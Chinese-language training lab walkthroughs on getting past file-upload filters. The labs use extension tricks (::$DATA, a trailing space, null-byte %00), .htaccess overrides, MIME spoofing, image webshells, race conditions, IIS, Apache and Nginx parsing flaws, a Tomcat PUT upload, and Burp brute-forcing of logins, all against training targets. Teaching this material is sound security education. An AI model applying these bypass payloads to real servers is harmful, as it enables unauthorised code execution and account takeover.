后缀名检测绕过2. MIME类型检测与绕过3. 文件内容检测与绕过4. 00截断绕过5. 条件竞争检测与绕过 后缀名检测的绕过方法也有很多，常见的有： 123456789101. 黑名单--大小写绕过2. 黑名单--名单列表绕过3. 黑名单--Windows特性（末尾的点【.】）绕过4. 黑名单--Windows特性（空格【 】）绕过5. 黑名单--Windows特性（::$DATA）绕过6. 白名单（需要结合文件包含漏洞或者Web服务器解析漏洞）7. .htaccess文件攻击--匹配文件内容8. .htaccess文件攻击--配皮文件名中的关键字9. .htaccess文件攻击--匹配文件名10. Apache解析漏洞 一些特殊的文件命名方式在Windows下是不被允许的，利用Burp Suite工具抓包修改后缀名，绕过服务端的验证后上传文件，Windows会自动去掉后面添加的。注：此方法只适应于Windows，因为Unix&#x2F;Linux系统没有这个特性。 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/upfile/2/upload4.html 2、在操作机上准备要上传的文件（脚本文件），比如新建info.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，文件上传失败，此文件不允许上传 5、尝试利用大小写绕过，将脚本文件info.php更改为info.pHp，以及尝试寻找黑名单列表之外可允许上传的文件后缀名进行绕过，将脚本文件info.php更改为info.php3或者info.phtml，再次选择脚本文件上传，依然失败，此文件不允许上传 6、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 7、切换到“Proxy”代理模块的“Options”，查看Bp的代理 8、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 9、点击“submit”按钮，再次上传文件，Bp成功抓取数据包 10、利用Windows特性，给文件名加“.”绕过服务端后缀名的检测，将数据包中的后缀名info.php改为info.php. 11、点击“Forward”，转发数据包，切换到浏览器，依然上传失败，后缀名不允许“.”出现 12、关闭浏览器代理，重新选择脚本文件 13、再次打开浏览器代理，点击“submit”按钮，上传文件并抓取数据包 14、利用Windows特性，给文件名加“（空格）”绕过服务端后缀名的检测，将数据包中的后缀名info.php改为info.php 15、点击“Forward”，转发数据包，切换到浏览器，脚本文件成功上传 16、关闭浏览器代理 17、访问http://ip/upfile/2/upload/info.php （访问http://ip/upfile/2/upload/info.php也可以），上传的脚本文件成功解析 实验总结掌握文件上传的服务端检测中的后缀名检测原理，“【 】”在Windows下是不被允许的，利用Burp Suite抓包在文件后缀名处添加“【 】”，绕过服务端的验证后上传文件，Windows会自动去掉后面添加的空格（【 】）。 后缀名检测与绕过之Windows特性（::$DATA）绕过实验目的通过本实验，掌握文件上传服务端检测中的后缀名的检测原理以及绕过方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/upfile/2/upload5.html 实验原理文件上传从客户端进行检测显然是防护不足的，所以需要从服务器端进行防护。服务端的检测与绕过方法有很多，常见的有： 123451. 后缀名检测绕过2. MIME类型检测与绕过3. 文件内容检测与绕过4. 00截断绕过5. 条件竞争检测与绕过 后缀名检测的绕过方法也有很多，常见的有： 123456789101. 黑名单--大小写绕过2. 黑名单--名单列表绕过3. 黑名单--Windows特性（末尾的点【.】）绕过4. 黑名单--Windows特性（空格【 】）绕过5. 黑名单--Windows特性（::$DATA）绕过6. 白名单（需要结合文件包含漏洞或者Web服务器解析漏洞）7. .htaccess文件攻击--匹配文件内容8. .htaccess文件攻击--配皮文件名中的关键字9. .htaccess文件攻击--匹配文件名10. Apache解析漏洞 一些特殊的文件命名方式在Windows下是不被允许的，利用Burp Suite工具抓包修改后缀名，绕过服务端的验证后上传文件，Windows会自动去掉后面添加的。注：此方法只适应于Windows，因为Unix&#x2F;Linux系统没有这个特性。 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/upfile/2/upload5.html 2、在操作机上准备要上传的文件（脚本文件），比如新建info.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，文件上传失败，此文件不允许上传 5、尝试利用大小写绕过，将脚本文件info.php更改为info.pHp，以及尝试寻找黑名单列表之外可允许上传的文件后缀名进行绕过，将脚本文件info.php更改为info.php3或者info.phtml，再次选择脚本文件上传，依然失败，此文件不允许上传 6、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 7、切换到“Proxy”代理模块的“Options”，查看Bp的代理 8、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 9、点击“submit”按钮，再次上传文件，Bp成功抓取数据包 10、利用Windows特性，给文件名加“.”绕过服务端后缀名的检测，将数据包中的后缀名info.php改为info.php.，依然上传失败，后缀名不允许有.出现 11、利用Windows特性，给文件名加“（空格）”绕过服务端后缀名的检测，将数据包中的后缀名info.php改为info.php ，依然上传失败，此文件不允许上传 12、关闭浏览器代理，重新选择脚本文件 13、再次打开浏览器代理，点击“submit”按钮，上传文件并抓取数据包 14、利用Windows特性，给文件名加“（::$DATA）”绕过服务端后缀名的检测，将数据包中的后缀名info.php改为info.php 15、点击“Forward”，转发数据包，切换到浏览器，脚本文件成功上传 16、关闭浏览器代理 17、访问http://ip/upfile/2/upload/info.php::$DATA，解析失败，未找到上传的文件，因为Windows的特性会自动去掉“::$DATA”，info.php::$DATA文件会变为info.php 18、访问http://ip/upfile/2/upload/info.php，上传的脚本文件成功解析 实验总结掌握文件上传的服务端检测中的后缀名检测原理，“【::$DATA】”在Windows下是不被允许的，利用Burp Suite抓包在文件后缀名处添加“【::$DATA】”，绕过服务端的验证后上传文件，Windows会自动去掉后面添加的::$DATA。 后缀名检测与绕过之.htaccess文件攻击实验目的通过本实验，掌握文件上传服务端检测中的后缀名的检测原理以及绕过方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/upfile/2/upload6.html 实验原理文件上传从客户端进行检测显然是防护不足的，所以需要从服务器端进行防护。服务端的检测与绕过方法有很多，常见的有： 123451. 后缀名检测绕过2. MIME类型检测与绕过3. 文件内容检测与绕过4. 00截断绕过5. 条件竞争检测与绕过 后缀名检测的绕过方法也有很多，常见的有： 123456789101. 黑名单--大小写绕过2. 黑名单--名单列表绕过3. 黑名单--Windows特性（末尾的点【.】）绕过4. 黑名单--Windows特性（空格【 】）绕过5. 黑名单--Windows特性（::$DATA）绕过6. 白名单（需要结合文件包含漏洞或者Web服务器解析漏洞）7. .htaccess文件攻击--匹配文件内容8. .htaccess文件攻击--配皮文件名中的关键字9. .htaccess文件攻击--匹配文件名10. Apache解析漏洞 .htaccess文件是Apache服务器中的分布式配置文件（IIS中不存在该文件），该配置文件会覆盖Apache服务器的全局配置，作用于当前目录及其子目录。在httpd.conf配置文件中，AllowOverride参数就是指明Apache服务器是否去找.htacess文件作为配置文件，如果设置为none,那么服务器将忽略.htacess文件；如果设置为All,那么将启用.htaccess文件，所有在.htaccess文件里的指令都将被重写，即允许.htaccess文件覆盖掉Apache的配置。如果一个Web应用允许上传.htaccess文件，且.htaccess文件启用，那就意味着攻击者可以更改Apache的配置，这是十分危险。.htaccess文件攻击有三种方式： 当.htaccess文件内容如下，会将内容符合php语法规则的文件当作php文件解析 匹配文件名中的关键字（比如：当文件名[info.php.png] 中包含关键字[.php]，并且.htaccess文件内容如下，info.php.png中的代码会被执行） 匹配文件名，当.htaccess文件内容如下，可以将匹配到的文件名的文件中的代码执行 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/upfile/2/upload6.html 2、在操作机上准备要上传的文件（脚本文件），比如新建info.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，文件上传失败，此文件不允许上传 5、尝试大小写绕过、Windows特性，依然失败，此文件不允许上传 6、新建.htaccess文件 7、选择.htaccess文件，点击“submit”按钮，上传.htaccess文件，成功上传 8、将脚本文件info.php修改后缀名为可允许上传得info.jpg，再选择文件 9、点击“submit”按钮，再次上传文件，成功上传 10、访问http://ip/upfile/2/upload/info.jpg，上传的脚本文件成功解析 实验总结掌握文件上传的服务端检测中的后缀名检测原理，类似于php、asp、jsp等脚本文件得后缀不允许上传，通过上传.htaccess文件，利用.htaccess文件攻击，将内容符合PHP语法规则的文件当作PHP脚本来解析，从而实现解析上传的脚本文件。 MIME类型检测与绕过实验目的通过本实验，掌握文件上传服务端检测中的MIME类型的检测原理以及绕过方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/upfile/3/upload.html 实验原理文件上传从客户端进行检测显然是防护不足的，所以需要从服务器端进行防护。服务端的检测与绕过方法有很多，常见的有： 123451. 后缀名检测绕过2. MIME类型检测与绕过3. 文件内容检测与绕过4. 00截断绕过5. 条件竞争检测与绕过 MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。MIME消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。常见的MIME类型如下： 文件扩展名 Mime-Type .js application&#x2F;x-javascript .html text&#x2F;html .jpg image&#x2F;jpeg .png image&#x2F;png .pdf application&#x2F;pdf 在HTTP协议中，使用Content-Type字段表示文件的MIME类型。 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/upfile/3/upload.html 2、在操作机上准备要上传的文件（脚本文件），比如新建info.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，文件上传失败，不允许的格式application&#x2F;octet-stream 5、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 6、切换到“Proxy”代理模块的“Options”，查看Bp的代理 7、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 8、点击“submit”按钮，再次上传文件，Bp成功抓取数据包 9、将数据包中Content-Type值application&#x2F;octer-stream修改为image&#x2F;jpeg 10、点击“Forward”，转发数据包，切换到浏览器，脚本文件成功上传 11、关闭浏览器代理 12、访问http://ip/upfile/3/upload/info.php，上传的脚本文件成功解析 实验总结掌握文件上传的服务端检测中的MIME类型检测原理以及MIME类型在HTTP数据包中的表示形式，php脚本的MIME类型不允许，通过Burp Suite工具抓包将php脚本的MIME类型修改为图片文件的MIME类型，绕过MIME类型的检测。 文件内容检测与绕过之文件幻数实验目的通过本实验，掌握文件上传服务端检测中的文件内容的检测原理以及绕过方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/upfile/4/upload.html 实验原理文件上传从客户端进行检测显然是防护不足的，所以需要从服务器端进行防护。服务端的检测与绕过方法有很多，常见的有： 123451. 后缀名检测绕过2. MIME类型检测与绕过3. 文件内容检测与绕过4. 00截断绕过5. 条件竞争检测与绕过 文件内容的检测是利用getimagesize()函数获取图片的宽高等信息，如果上传的不是图片，那么则获取不到信息。文件内容检测的绕过常见的有两种方式： 在脚本文件前面补充对应的文件头常见的图片文件头 123JPG：FF D8 FF E0 00 10 4A 46 49 46GIF：47 49 46 38 39 61(GIF89a)PNG：89 50 4E 47 制作图片马制作图片马的方式也有很多，常见的有： 1234在图片后写入脚本代码在cmd中使用命令 copy 1.jpg/b+1.php/a 2.jpg- 参数/b指定以二进制格式复制、合并文件，用于图像类/声音类文件- 参数/a指定以ASCII格式复制、合并文件，用于txt等文档类文件 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/upfile/4/upload.html 2、在操作机上准备要上传的文件（脚本文件），比如新建info.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，文件上传失败，不允许的文件 5、以记事本或编辑器的方式打开脚本文件，补充图片的文件头（比如GIF文件头） 6、再次选择脚本文件 7、点击“submit”按钮，再次上传文件，脚本文件成功上传 8、访问http://ip/upfile/4/upload/info.php，上传的脚本文件成功解析 实验总结掌握文件上传的服务端检测中的文件内容类型检测原理以及绕过方法，了解三种图片格式的文件头，通过补充文件头绕过文件内容的检测。 文件内容检测与绕过之图片马实验目的通过本实验，掌握文件上传服务端检测中的文件内容的检测原理以及绕过方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/upfile/4/upload.html 实验原理文件上传从客户端进行检测显然是防护不足的，所以需要从服务器端进行防护。服务端的检测与绕过方法有很多，常见的有： 123451. 后缀名检测绕过2. MIME类型检测与绕过3. 文件内容检测与绕过4. 00截断绕过5. 条件竞争检测与绕过 文件内容的检测是利用getimagesize()函数获取图片的宽高等信息，如果上传的不是图片，那么则获取不到信息。文件内容检测的绕过常见的有两种方式： 在脚本文件前面补充对应的文件头常见的图片文件头 123JPG：FF D8 FF E0 00 10 4A 46 49 46GIF：47 49 46 38 39 61(GIF89a)PNG：89 50 4E 47 制作图片马制作图片马的方式也有很多，常见的有： 1234在图片后写入脚本代码在cmd中使用命令 copy 1.jpg/b+1.php/a 2.jpg- 参数/b指定以二进制格式复制、合并文件，用于图像类/声音类文件- 参数/a指定以ASCII格式复制、合并文件，用于txt等文档类文件 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/upfile/4/upload.html 2、在操作机上准备要上传的文件（脚本文件），比如新建1.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，文件上传失败，不允许的文件 5、再准备一张正常的图片，打开cmd命令框，制作图片马 6、再次选择脚本文件 7、点击“submit”按钮，再次上传文件，脚本文件成功上传 8、访问http://ip/upfile/4/upload/info.jpg，上传的脚本文件不能解析，**因为图片马需要配合文件包含漏洞或者解析漏洞** 实验总结掌握文件上传的服务端检测中的文件内容类型检测原理以及绕过方法，了解三种图片格式的文件头，通过制作图片马绕过文件内容的检测，但是图片木的解析需要配合文件包含漏洞或者解析漏洞。 基于GET方式的00截断绕过实验目的通过本实验，掌握文件上传服务端检测中的基于GET方式的00截断绕过方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/upfile/5/up.php 实验原理文件上传从客户端进行检测显然是防护不足的，所以需要从服务器端进行防护。服务端的检测与绕过方法有很多，常见的有： 123451. 后缀名检测绕过2. MIME类型检测与绕过3. 文件内容检测与绕过4. 00截断绕过5. 条件竞争检测与绕过 截断漏洞出现的核心就是chr(0)，这个字符不为空 (Null)，也不是空字符 (“ “)，更不是空格。当程序在输出含有 chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致了漏洞产生。由于0x00是字符串的结束标识符，PHP会把0x00后面的所有字符删除。攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。利用00截断绕过需要同时满足两个条件： 121. PHP版本必须小于5.3.42. php.ini配置文件中的magic_quotes_gpc为Off状态（GPC关闭） 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/upfile/5/up.php 2、在操作机上准备要上传的文件（脚本文件），比如新建info.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，文件上传失败，不允许的后缀，且URL中有参数 5、将脚本文件info.php的后缀名修改为可允许上传的图片文件的后缀名，比如info.jpg，然后再次选择脚本文件 6、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 7、切换到“Proxy”代理模块的“Options”，查看Bp的代理 8、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 9、点击“submit”按钮，再次上传文件，Bp成功抓取数据包 10、将数据包”jieduan”参数添加”info.php%00” 11、点击“Forward”，转发数据包，切换到浏览器，脚本文件成功上传 12、关闭浏览器代理 13、访问http://ip/upfile/5/upload/info.php8620210529121207.jpg，脚本解析失败，找不到文件 14、访问http://ip/upfile/5/upload/info.php，上传的脚本文件成功解析 实验总结掌握文件上传的服务端检测中的基于GET方式的00截断绕过，在使用基于GET方式的00截断绕过服务端的检测上传脚本文件时可以利用BurpSuite工具抓包在数据包的URL中添加“%00”，由于0x00是字符串的结束标识符，PHP会把0x00后面的所有字符删除，所以访问0x00前面的才可以成功解析。 基于POST方式的00截断绕过实验目的通过本实验，掌握文件上传服务端检测中的基于POST方式的00截断绕过方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/upfile/5/up2.php 实验原理文件上传从客户端进行检测显然是防护不足的，所以需要从服务器端进行防护。服务端的检测与绕过方法有很多，常见的有： 123451. 后缀名检测绕过2. MIME类型检测与绕过3. 文件内容检测与绕过4. 00截断绕过5. 条件竞争检测与绕过 截断漏洞出现的核心就是chr(0)，这个字符不为空 (Null)，也不是空字符 (“ “)，更不是空格。当程序在输出含有 chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致了漏洞产生。由于0x00是字符串的结束标识符，PHP会把0x00后面的所有字符删除。攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。利用00截断绕过需要同时满足两个条件： 121. PHP版本必须小于5.3.42. php.ini配置文件中的magic_quotes_gpc为Off状态（GPC关闭） 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/upfile/5/up2.php 2、在操作机上准备要上传的文件（脚本文件），比如新建info.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，文件上传失败，不允许的后缀 5、将脚本文件info.php的后缀名修改为可允许上传的图片文件的后缀名，比如info.jpg，然后再次选择脚本文件 6、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 7、切换到“Proxy”代理模块的“Options”，查看Bp的代理 8、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 9、点击“submit”按钮，再次上传文件，Bp成功抓取数据包 10、在Burp Suite中点击右侧的”INSPECTOR”，并点击”Body Parameters(3)” 11、选中”jieduan”参数，点击右侧的”&gt;”，显示细节 12、将”VALUE”中”.&#x2F;upload&#x2F;“修改为”.%2fupload%2finfo.php%00”，然后将下方”DECODED FROM”中的字符串复制到左侧的”.&#x2F;upload&#x2F;“处 13、点击“Forward”，转发数据包，切换到浏览器，脚本文件成功上传 14、关闭浏览器代理 15、访问http://ip/upfile/5/upload/info.php1220210529150618.jpg，脚本解析失败，找不到文件 16、访问http://ip/upfile/5/upload/info.php，上传的脚本文件成功解析 实验总结掌握文件上传的服务端检测中的基于POST方式的00截断绕过，在使用基于POST方式的00截断绕过服务端的检测上传脚本文件时可以利用Burp Suite工具抓包在数据包使用十六进制修改消息数据，由于0x00是字符串的结束标识符，PHP会把0x00后面的所有字符删除，所以访问0x00前面的才可以成功解析。注：老版本的Burp Suite在代理模块中有“Hex”功能，可以直接编辑消息的原始二进制数据，直接将脚本文件后缀名后的数据修改为”00”即可。 条件竞争检测与绕过实验目的通过本实验，掌握文件上传服务端检测中的条件竞争的检测原理以及绕过方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/upfile/6/upload.html 实验原理文件上传从客户端进行检测显然是防护不足的，所以需要从服务器端进行防护。服务端的检测与绕过方法有很多，常见的有： 123451. 后缀名检测绕过2. MIME类型检测与绕过3. 文件内容检测与绕过4. 00截断绕过5. 条件竞争检测与绕过 条件竞争是一种服务器端的漏洞，由于服务器端在处理不同的请求时是并发进行的，因此如果并发处理不当或相关操作顺序设计的不合理时，将会导致此类问题的发生。一些网站文件检测逻辑是先允许上传任意文件，然后检查文件内容是否包含可执行脚本，如果包含则删除。如果在删除之前访问上传的php文件，从而执行上传文件中的php代码。在这整个过程中，会出现以下三种情况： 1231. 访问时间点在上传成功之前，没有此文件2. 访问时间点在刚上传成功但还没有进行见判断检查，该文件存在3. 访问时间点在判断之后，文件被删除，没有此文件 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/upfile/6/upload.html 2、在操作机上准备要上传的文件（脚本文件），比如新建1.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，文件上传成功 5、访问http://ip/upfile/6/upload/info.php，找不到该文件 6、将脚本文件info.php的脚本内容修改 7、点击“选择文件”按钮，再次选中要上传的文件 8、点击“submit”按钮，上传文件，并立即访问http://ip/upfile/6/upload/info.php（利用时间差，要**快**），没有报错，说明上传的脚本成功解析 9、访问http://ip/upfile/6/shell.php，新的脚本文件成功解析 实验总结掌握文件上传的服务端检测中的条件竞争检测原理以及绕过方法。上传脚本文件，成功上传，但访问时找不到文件，可能存在条件竞争。可以上传一个生成新的文件的脚本文件，利用成功上传到删除文件的时间差（时间差太短可以利用Python脚本实现），在未删除之前立即访问（访问时不报错，说明上传的文件访问时成功解析），则会自动生成一个新的文件，新文件不在检查范围内，即不会被删除。 IIS6.0文件解析漏洞–特殊符号”&#x2F;“实验目的通过本实验，掌握windows下IIS6.0文件解析漏洞的利用方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：windows server 2003下的IIS6.0 实验地址：http://ip/iis 实验原理文件上传使用白名单做限制，只能上传图片文件，导致脚本文件无法上传，上传图片马绕过白名单文件上传的验证，但是图片马又无法解析，利用IIS6.0文件解析漏洞的特点，从而解析脚本文件。 IIS除了可以解析.asp后缀的脚本以外，还可以解析.cer和.asa后缀的文件 特殊符号“&#x2F;”，任意文件夹名.asp目录下的任何文件都会被IIS当作asp脚本执行 特殊符号“;”，任意文件名.asp;.jpg，后缀是.jpg，可以绕过限制，但是IIS6.0的特殊符号“;”会将该文件当作asp脚本执行 实验步骤IIS除了可以解析.asp后缀的脚本以外，还可以解析.cer和.asa后缀的文件 1、登录操作机，打开浏览器，访问http://ip/iis/sangfor.asp，asp脚本解析执行，返回当前时间 2、访问http://ip/iis/sangfor.asa，文件依然解析执行，返回当前时间 3、访问http://ip/iis/sangfor.cer，文件依然解析执行，返回当前时间 特殊符号“&#x2F;” 4、访问http://ip/iis/iis.asp/sangfor.asp，文件依然解析执行，返回当前时间 5、访问http://ip/iis/iis.asp/sangfor.txt，文件依然解析执行，返回当前时间 6、访问http://ip/iis/iis.asp/sangfor.jpg，文件依然解析执行，返回当前时间 7、访问http://ip/iis/iis.asp/sangfor.rar，文件依然解析执行，返回当前时间 8、访问http://ip/iis/iis.asp/sangfor.xxx，文件依然解析执行，返回当前时间 实验总结掌握利用IIS6.0文件解析漏洞，绕过白名单限制，解析脚本文件。 IIS6.0文件解析漏洞–特殊符号”;”实验目的通过本实验，掌握windows下IIS6.0文件解析漏洞的利用方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：windows server 2003下的IIS6.0 实验地址：http://ip/upload/up.asp 实验原理文件上传使用白名单做限制，只能上传图片文件，导致脚本文件无法上传，上传图片马绕过白名单文件上传的验证，但是图片马又无法解析，利用IIS6.0文件解析漏洞的特点，从而解析脚本文件。 IIS除了可以解析.asp后缀的脚本以外，还可以解析.cer和.asa后缀的文件 特殊符号“&#x2F;”，任意文件夹名.asp目录下的任何文件都会被IIS当作asp脚本执行 特殊符号“;”，任意文件名.asp;.jpg，后缀是.jpg，可以绕过限制，但是IIS6.0的特殊符号“;”会将该文件当作asp脚本执行 实验步骤1、登录操作机，打开浏览器，访问http://ip/upload/up.asp 2、在操作机新建任意文件名的asp脚本，比如now.asp 3、点击“浏览”按钮，选择新建的asp脚本文件 4、点击“上传”按钮，上传选择的文件，文件格式不正确，上传失败 5、点击“重新上传文件”，将新建的文件重命名为now.asp;.jpg，并选择该文件 6、点击“上传”按钮，上传选择的文件，上传成功 7、访问http://ip/upload/image/now.asp;.jpg，脚本成功解析 实验总结掌握利用IIS6.0文件解析漏洞，绕过白名单限制，解析脚本文件。 IIS7.5文件解析漏洞实验目的通过本实验，掌握windows下IIS7.5文件解析漏洞的利用方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：windows server 2008R2下的IIS7.5 实验地址：http://ip/index.php 实验原理文件上传使用白名单做限制，只能上传图片文件，导致脚本文件无法上传，上传图片马绕过白名单文件上传的验证，但是图片马又无法解析，利用IIS7.5文件解析漏洞的特点：任意文件名&#x2F;任意文件名.php，从而解析脚本文件。 实验步骤1、登录操作机，打开浏览器，访问http://ip/index.php 2、在操作机上准备要上传的文件（任意文件都可以），比如新建info.php文件 3、上传任意的文件，发现为白名单验证。 4、创建后缀名为.png的文件，文件内容如下。 5、上传成功，F12查看文件返回地址。 6、访问文件。 7、利用IIS7.5文件解析漏洞特性访问：http://ip/upload/6720210701210811.png/.php，脚本文件成功解析 实验总结掌握利用IIS7.5文件解析漏洞，绕过白名单限制，解析脚本文件。 Apache文件解析漏洞实验目的掌握Apache文件解析漏洞利用方法。 实验环境两台主机一台windows服务器，操作系统为windows10。一台Centos7服务器，该服务器为目标靶机。 实验原理利用Apache多后缀解析漏洞，绕过白名单文件上传验证。 实验步骤1、登录操作机12用户名：administrater密码： Sangfor!7890 2、访问http://192.168.0.1313、上传一个名为xxx.xxx的文件，被拦截，判断为白名单验证。 4、上传文件xxx.php.png，文件内容如下，上传成功 5、利用Apache多后缀解析漏洞访问uploadfiles&#x2F;xxx.php.png 6、xxx.php.png被成功解析为php文件Nginx文件解析漏洞实验目的通过本实验，掌握Nginx文件解析漏洞的利用方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Centos7.2下的Nginx 实验地址：http://ip 实验原理文件上传使用白名单做限制，只能上传图片文件，导致脚本文件无法上传，上传图片马绕过白名单文件上传的验证，但是图片马又无法解析，利用Nginx文件解析漏洞的特点：任意文件名&#x2F;任意文件名.php，从而解析脚本文件。 实验步骤1、登录操作机，访问http://ip 2、上传任意的文件，上传失败，发现为白名单验证。 3、使用windows的画图创建任意的png图片文件。 4、使用Edit Plust编辑上一步中的png文件，在文件末尾加入代码 1&lt;?php phpinfo();?&gt; 5、将.png文件上传。 6、上传成功，访问上传的.png文件，脚本没有解析。 7、利用Nginx文件解析漏洞访问：http://ip/uploadfiles/4a47a0db6e60853dedfcfdf08a5ca249.png/.php，脚本文件成功解析 实验总结掌握利用Nginx文件解析漏洞，绕过白名单限制，解析脚本文件。 Tomcat任意文件上传（CVE-2017-12615）实验目的通过本实验，掌握文件上传中的Tomcat任意文件上传的漏洞，以及该漏洞影响的Tomcat版本以及配置。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 实验地址：http://ip:8080 实验原理Tomcat配置文件web.xml中，servlet配置了readonly&#x3D;fasle时，会引发任意文件上传漏洞。readonly参数默认是true，即不允许delete和put操作，所以通过XMLHttpRequest对象的put或者delete方法访问就会报告http 403错误。但很多时候为了支持REST服务，会设置该属性为false。将readonly参数设置为false时，即可通过PUT方式创建一个JSP文件，并可以执行任意代码。在Tomcat文件夹下的&#x2F;conf&#x2F;web.xml文件中，添加readonly参数，属性值为false，即在114行插入以下内容：修改配置文件完成后需要重启Tomcat，重启的方式是双击Tomcat目录下的bin目录下的shutdown.bat，在点击startup.bat。Tomcat任意文件上传（CVE-2017-12615）漏洞影响的Tomcat版本为： 1tomcat7.0.0-7.0.81 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip:8080 2、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 3、切换到“Proxy”代理模块的“Options”，查看Bp的代理，选中该代理，点击左侧的”Edit”，将其端口修改为8088（避免与Tomcat端口冲突） 4、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），选中该代理，将其端口也修改为8088，与Bp的代理一致（注：代理名称可以修改也可以不修改） 5、刷新网页，Bp成功抓取数据包 6、鼠标右击，点击”Send to Repeater”（或者快捷键”Ctrl” + “R”），发送数据包到Repeater模块，然后切换到Repeater模块 7、修改数据包，尝试上传jsp脚本文件 8、点击上面的”Send”，发送修改后的数据包，结果返回404，请求被拦截，不能直接上传jsp文件 9、由于文件名的限制，在数据包中添加”%20”（空格的URL编码），绕过限制，再次点击上面的”Send”，返回201，上传成功 10、关闭浏览器代理 11、访问http://ip:8080/hack.jsp，新的脚本文件成功解析 实验总结掌握文件上传中的Tomcat任意文件上传（CVE-2017-12615）漏洞影响的Tomcat版本以及配置文件，利用BurpSuite工具抓取数据包，将数据包内容修改，请求方式修改为PUT方式，上传新建的jsp脚本文件，文件内容可以任意编写，也可以是木马。上传时结果返回404，请求被拦截，不能直接上传jsp文件，是因为有限制： 121. NTFS文件流2. 文件名相关限制 可以采取一些方法来绕过限制，比如Windows中文件名不能以空格结尾，在文件名后面加空格”%20”，也可以加斜杠”&#x2F;“。","tags":["sxf","Red"],"categories":["Experiments"]},{"title":"某厂产业教育 - 逻辑漏洞原理与验证","path":"/2024/09/13/红蓝攻防/ⅩR逻辑漏洞原理与验证/","content":"验证机制之暴力破解用户名密码实验目的通过本实验，掌握使用字典暴力破解绕过登录验证。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/webug/pentest/test/b2e16da5985ee1be/index.html 实验原理登录页面在设置用户名和密码的时候，没有遵循密码设置规则，借助字典利用穷举法将所有可能的用户名和密码一一尝试，进行蛮力攻击，最后暴力破解出用户名和密码，绕过验证机制。 实验步骤1、登陆”Attack”操作机，打开浏览器，访问http://ip/webug/pentest/test/b2e16da5985ee1be/index.html 2、随便输入用户名为：“root”，密码为“123456”提交，登陆失败 3、返回登陆页面，还是随便输入用户名为：“root”，密码为“123456” 4、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 5、切换到“Proxy”代理模块的“Options”，查看Bp的代理 6、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 7、点击“登录”，提交输入的用户名和密码，Bp成功抓取数据包 8、右键，选择“Send to Intruder”，将数据包发送到暴破模块 9、将攻击模式设置为“Cluster bomb” 10、切换到“Payloads”，设置攻击载荷。设置攻击位置1的payload类型为”Simple list”，并加载用户名字典 11、设置攻击位置2的payload类型为”Simple list”，并加载密码字典 12、点击“Start attack”，开始暴力破解，暴破成功 实验总结通过本实验，掌握使用字典暴力破解，对暴破的结果根据长度进行分析，长度值与其他不同的就是正确结果，从而绕过登录验证机制。 